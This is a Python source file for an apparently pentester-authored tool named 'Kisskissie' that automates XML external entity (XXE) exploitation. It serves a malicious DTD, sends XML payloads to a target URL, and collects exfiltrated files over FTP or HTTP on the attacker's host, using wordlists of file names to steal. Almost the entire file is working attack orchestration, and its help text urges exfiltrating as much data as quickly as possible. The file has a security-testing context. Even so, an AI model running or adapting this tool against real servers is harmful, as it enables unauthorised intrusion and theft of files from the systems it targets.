#!/usr/bin/python
'''
POC script to automate xxe detection and exploitation on a particular application being tested by me.
Idea is to evolve this scipt into a generic xxe detector based on template payloads and automated fuzzing.
mkocbayi@gmail.com
Note: If you set thread limit too high (>10) you may miss data.
Some files that should be exfiltrated may not return because of their size.
TODO:
Support authentication when connecting to target.
Specify http headers in templates and command line option.
Check if victim is vulnerable to XXE.
Check for common OS files and automatically select files for exfil.
Add gopher collector.
'''
from __future__ import print_function
from socket import *
import os
import sys
script_path = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(script_path, 'libs'))
import signal
from signal import *
from DtdServer import DtdServer
from threading import Thread
from Smasher import Smasher
from Queue import Queue
import argparse
import collectors
import getopt
#used for retrieving ip address of iface
import netifaces as ni
import datetime
import threading
from copy import deepcopy
import logging
import pprint
import getpass
#logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

settings = {
    'collector_message_queue' : Queue(), 
    'dtd_message_queue' : Queue(),
    'smasher_message_queue' : Queue(),
    'collector_port' : None,
    'dtd_host' : None,
    'dtd_port' : None,
    'collector_host' : None,
    'sif' : None,
    'debug': False, 
    'script_path': script_path, 
    'wordlists_path': os.path.join(script_path, 'wordlists'),
    'exfiltrate_wordlists': os.path.join(script_path, 'wordlists',
                                         'exfiltrate_wordlists'),
    'log_path': os.path.join(script_path, 'logs'),
    'log_results_path' : os.path.join(script_path, 'files'),
    'collector_messages' : [], #list of received messages from threads
    'dtd_messages' : [], #list of received messages from threads
    'smasher_messages' : [], #list of received messages from threads
    'thread_limit' : 1, #number of threads for scanning
}

thread_jobs = []
lock = threading.Lock()

#Used for helping with printing with threads
print = lambda x: sys.stdout.write("%s\n" % x)
sys.stdout.flush()


def catchSignal(*args):
    sys.exit(0)


for sig in (SIGABRT, SIGILL, SIGINT, SIGSEGV, SIGTERM):
    signal(sig, catchSignal)


def set_new_log_path():
    current_datetime = datetime.datetime.now()
    filename = current_datetime.strftime("%Y%m%d_%H%M%S")
    settings['log_results_path'] = os.path.join(settings['log_path'], filename)
    os.makedirs(settings['log_results_path'])
    

def getDtdServer(collector_url):
    def doDtdServer():
        template_name = os.path.join(settings['script_path'],
                                     'templates', 'dtd', 'send.dtd')
        dtd_server = DtdServer(
                queue=settings['dtd_message_queue'], 
                collector_url=collector_url,
                port=settings['dtd_port'], 
                template_name=template_name, 
                debug = settings['debug'], 
                )
        dtd_server.run()
    return doDtdServer


def doReceiveCollectorMessages():
    with open(os.path.join(
            settings['log_results_path'], 'manifest.csv'), 'w') as f:
        while True:
            print("Waiting for Collector messages")
            message = settings['collector_message_queue'].get(block=True)
            collector_job = getMessageWithScanID(
                message['scan_id'], settings['collector_messages'])

            if collector_job:
                print("{}: already collected")
                collector_job['count'] = collector_job['count'] + 1
            else:
                scan_job = getMessageWithScanID(message['scan_id'],
                                                settings['smasher_messages'])
                if scan_job:
                    f.write("{0},{1},{2}\n".format(
                        message['file_id'],
                        message['source_ip'],
                        scan_job['exfiltrate_filename']))
                else:
                    print("{}: no corresponding scan job".format(
                        message['scan_id']))

            if settings['debug']:
                print(message)


def getMessageWithScanID(scan_id, message_list):
    for message in message_list:
        if message['scan_id'] == scan_id:
            return message


def doReceiveDtdMessages():
    while True:
        print("Waiting for DTD messages")
        message = settings['dtd_message_queue'].get()
        settings['dtd_messages'].append(deepcopy(message))
        if settings['debug']:
            print(message)


def doReceiveSmasherMessages():
    print("\nWaiting for Smasher messages")
    while True:
        print("\nReceived Smasher message")
        message = settings['smasher_message_queue'].get()
        settings['smasher_messages'].append(deepcopy(message))
        if settings['debug']:
            print(message)


def read_user_input():
    while True:
        user_input = raw_input('Type q to quit\n')
        if user_input == 'q':
            sys.exit(0)
    
def doStartThreads():
    collector_obj = getattr(collectors, settings['collector_type'])
    collector = collector_obj(
        (settings['collector_host'], settings['collector_port']),
        settings['log_results_path'],
        settings['collector_message_queue'])
    collector.daemon = True
    thread_jobs.append(collector)

    thread = Thread(target=getDtdServer(collector.get_exfil_url('$scan_id')))
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveCollectorMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveDtdMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doReceiveSmasherMessages)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=doStartSmasher)
    thread.daemon = True
    thread_jobs.append(thread)
    thread = Thread(target=read_user_input)
    thread.daemon = False #This thread will allow the main script to block while waiting for user input
    thread_jobs.append(thread)

    print('*** Main thread waiting')
    for thread_job in thread_jobs:
        thread_job.start()
    print('*** Done')
    

def doStartSmasher():
    smasher = Smasher(queue=settings['smasher_message_queue'], 
                      target_url=settings['target_url'],
                      dtd_server=settings['dtd_host'], 
                      dtd_port=settings['dtd_port'], 
                      template_name=os.path.join(settings['script_path'],
                                                 'templates',
                                                 'smasher',
                                                 settings['template']), 
                      dtd_filename='send.dtd', 
                      exfiltrate_wordlists=settings['exfiltrate_wordlists'], 
                      debug=settings['debug'], 
                      thread_limit=settings['thread_limit'],
                      tls_skip_verify=settings['tls_skip_verify'],
                      auth=settings['auth'])
    smasher.run()

def get_ip_address(ifname):
    return ni.ifaddresses(ifname)[2][0]['addr']

def main():
    set_new_log_path()

    parser = argparse.ArgumentParser(
                description="Kisskissie is a tool to automate XXE exfiltration easier." 
                "You should use this tool after you have confirmed that your target is vulnerable to XXE and you wish to exfil as much data as quickly as you can."
            )
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--dtd_host',
                required=True,
                help="Host to serve DTD file which victim will retrieve. Usually same as collector host.")
    parser.add_argument('--dtd_port', type=int, required=True)
    parser.add_argument('--collector_type',
                default="FTPCollector",
                help="Specify exfiltrate protocol method. Supported collectors are FTPCollector|HTTPCollector")
    parser.add_argument('--collector_host',
                required=True,
                help="Server to send exfiltrate data to. This would be the host running this attack script.")
    parser.add_argument('--collector_port', type=int, required=True)
    parser.add_argument('--timeout')
    parser.add_argument('--sif')
    parser.add_argument('--thread_limit', type=int, default=1,
                        help="Speed up script by multi-threading.")
    parser.add_argument('--template', default='post.xml',
                        help="Use a custom template file for POST requests.")
    parser.add_argument('--auth-user', required=False, help="Specify a username for HTTP basic authentication.")
    parser.add_argument('--tls-skip-verify', action='store_true', help="Skip TLS certificate checking.")
    parser.add_argument('target_url', help="Target URL which is vulnerable to XXE.")
    args = parser.parse_args()
    settings.update(vars(args))

    auth_user = settings['auth_user']
    if auth_user is not None:
        settings['auth'] = (
            auth_user,
            getpass.getpass("Password for {}: ".format(auth_user)))
    else:
        settings['auth'] = None

    doStartThreads()
    
if __name__=='__main__':
    try:
        main()
    except Exception as e:
        print('Cannot run program.\n%s' %e)
        sys.exit(0)
